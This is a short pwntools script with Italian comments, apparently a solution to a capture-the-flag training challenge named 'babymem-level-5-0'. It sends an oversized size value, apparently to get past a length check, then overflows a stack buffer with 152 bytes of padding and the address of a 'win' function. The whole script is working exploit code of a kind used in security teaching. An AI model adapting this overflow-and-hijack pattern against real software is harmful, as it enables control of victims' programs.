from pwn import *

elf = ELF("/challenge/babymem-level-5-0")
p = elf.process()

# Dimensione della linea
p.sendline(b"2")
p.sendline(b"2147483648")

# p64 fa il packing da intero a indirizzo, little endian
payload = b"A"*(152) + p64(elf.symbols["win"])

# Mandare il payload
p.sendline(payload)

p.interactive()
